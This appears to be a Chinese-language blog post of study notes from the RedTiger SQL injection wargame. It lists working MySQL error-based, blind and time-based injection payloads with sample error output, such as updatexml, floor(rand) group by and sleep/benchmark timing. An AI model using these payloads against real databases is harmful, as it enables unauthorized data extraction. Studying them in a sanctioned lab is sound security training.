---
title: redtiger靶场训练笔记
slug: redtiger-lab-training-notes
date: 2022-05-06 09:12:42
categories:
- security
tags:
- security
- redtiger
---

## 前言

靶场地址：http://redtiger.labs.overthewire.org/

按照靶场约定，不会直接给任何解。仅记录在这个靶场练习的时候学到的东西。

## error based SQL injection

red tiger 靶场都是盲注，但还是要提一嘴。学到多少算多少。error based SQL injection 顾名思义要靠错误，所以前端有错误消息回显才有用。但盲注的时候依然能用到一些相关技巧。

### 当前表列数量

#### group by 法

```sql
select * from users group by 5;
# SQL 错误 [1054] [42S22]: Unknown column '5' in 'group statement'
# 5 是列号，不存在列的时候报上面的错，需要自己枚举 1,2,3,4,5 直到确认。因为一次测一个真/假所以盲注的时候也能用。
```

#### order by 法

```sql
select * from users order by 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;
# SQL 错误 [1054] [42S22]: Unknown column '3' in 'order clause'
# 3 是列号，order by 法一次可以枚举很多列，大多时候可以一次拿到当前表的列数。不过盲注的时候不行。可以用来缩小范围。
```

#### 子查询法

```sql
select * from users where (SELECT * from users)=(1,2);
# SQL 错误 [1241] [21000]: Operand should contain 2 column(s)
# 这个方法直接爆出有几个列，但要求知道表名
```

#### union 法

```sql
select * from users union all select 1,2,3,NULL,NULL,NULL,NULL,NULL,NULL 
# (types of columns must match or be of derived types or NULL)
# SQL 错误 [1222] [21000]: The used SELECT statements have a different number of columns
# 利用 union 查询列数量必须相等来确定左侧查询的列数量，如果左侧是 select * 的话那 union 查询枚举的列数量就是表里列的数量
```

### 获取列名

#### union+notnull

```sql
select * from users where (1,2,3) = (select * from users union all select 1%0,2,3);
# Error: Column 'id' cannot be null
# 实测发现在 MySQL 5.7 中不好使了，会出现 SQL 错误 [1242] [21000]: Subquery returns more than 1 row
```

#### insert

```sql
insert into users (id,username,passwd) values (if(1=1,NULL,'1'), '2','3')
# Error: Column 'id' cannot be null
# 要先得到列名，。而且实测 MySQL 5.7 里对主键+自增+非空，即使直接insert null 也会成功。
```

#### join

```sql
select * from (select * from users JOIN users a)b;
# Error: Duplicate column name 'id'
# 同样失效了。MySQL 5.7 下会返回重复的列名。
```

### 获取值

#### count floor(rand(0)*2) group by

```sql
select COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2) )x from users GROUP BY x;
# SQL 错误 [1062] [23000]: Duplicate entry '5.7.331' for key '<group_key>'
# 需要注意的是 COUNT(*) 不能少
```

> *Works because mysql insides executes this query by making two queries: add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table*

#### BIGINT UNSIGNED

```sql
select !(select * from (select version())x) - ~0;
# 在 MySQL 5.7 不起效。
# BIGINT UNSIGNED value is out of range in '((not((select `x`.`version()` from (select version() AS `version()`) `x`))) - ~(0))'
```

不过还存在一个能爆出列名的 payload。

```sql
select 2 * if((select * from test limit 1) > (select * from test limit 1), 18446744073709551610, 18446744073709551610);
# 注意 18446744073709551610 就是 ~0
# SQL 错误 [1690] [22001]: Data truncation: BIGINT UNSIGNED value is out of range in '(2 * if(((select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1) > (select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1)),18446744073709551610,18446744073709551610))'
# 这里会把 select * 展开成具体列名
```

#### updatexml

```sql
select updatexml(1, concat('~', version()), 1);
# SQL 错误 [1105] [HY000]: XPATH syntax error: '~5.7.33'
```

#### extractvalue

```sql
select extractvalue(1, concat('~', version()));
# SQL 错误 [1105] [HY000]: XPATH syntax error: '~5.7.33'
```

#### ST_LongFromGeoHash

```sql
select ST_LongFromGeoHash(version());
# MySQL >= 5.7.5
# SQL 错误 [1411] [HY000]: Incorrect geohash value: '5.7.33' for function ST_LONGFROMGEOHASH
```

## blind SQL injection

两个技巧。

### if/substring/ascii/char

灵活运用 `if`、`substring`、`ascii`、`char` 这些函数。

```sql
SELECT * FROM test WHERE id=0 OR IF(FIND_IN_SET(substring(version(),1,1),'0,1,2,3,4,5'),TRUE,FALSE);
```

`ascii`和`char`两个函数主要是解决不能注入字符串之类的问题。

```sql
SELECT * FROM test WHERE id = 0 OR ascii(substring(version(), 1, 1)) IN (48,49,50,51,52,53);
```

这样就能完全避免注入的SQL里包含`'`，对过滤 `'`的 WAF 大概会有用。

此外其他的返回布尔值的函数多少在合适的地方还是能一战的吧。

### order by

```sql
SELECT * FROM test ORDER BY (id*IF (ASCII(substring(VERSION(),1,1))=53,1,-1)) ;
```

注入点在 `order by` 子句的时候比较有用。

### find_in_set

这个就是纯 trick 了。用 `find_in_set` 可以一次判断更大的范围，减少请求次数。比如原本测试字符串一位就要跑字母表26个字母，算上大小写直接翻倍。`find_in_set`可以用的话就能实现二分法搜索，时间复杂度骤降。

## Time based SQL injection

也叫 *double blind SQL injection*， 双盲指的是就连SQL执行结果都看不到。不管传什么都返回完全相同的页面。这种情况只能靠请求时间来判断了。

### sleep

```sql
select if(version() like '5%', sleep(10), false);
```

不必多解释了吧。

### benchmark

```sql
select benchmark (10000000, md5(now()));
```

这种做法叫 `heavy queries`，就是给MySQL一个压力很大的查询，让MySQL花更长时间执行。除了 `benchmark` 之外还可以用 cross join ，求两个大表的笛卡尔积。cross join 时算法类似下面这样：

```go
for r1 := range table1 {
    for r2 := range table2 {
        results = append(results, pair(r1,r2))
    }
}
```

计算量等于两个表行数的积。不过前提是要知道表名，最少知道自己的表名，起码还能 JOIN 自己。如果数据量太少的话这个方法产生的返回时间差不够明显，就不能用了。

## 参考

- [MySQL 5.7 Manual - JSON function reference](https://dev.mysql.com/doc/refman/5.7/en/json-function-reference.html)
- [phonexicum.github.io SQLi](https://phonexicum.github.io/infosec/sql-injection.html)

## 思考

red tiger 的 level 1 和 level 2 真的很简单。选择正确的位置注入就能直接 pass，不需要考虑 bypass WAF，没有 trick。

level 3 开始就比较狗了，提示 try to get an error，但这句话不是让你往 error based SQL injection 的方向想，我就给带歪了，还想着怎么制造个能回显的注入 payload ，实际上根本不是这个意思。正确的方向是 制造一个 **PHP的错误**，解密 `usr` 这个参数。

具体就不说了，总之制造 PHP 的错误也需要动 `usr` ，我给的关键词是 type error，提示很明显了。

## 总结

以上，玩得开心。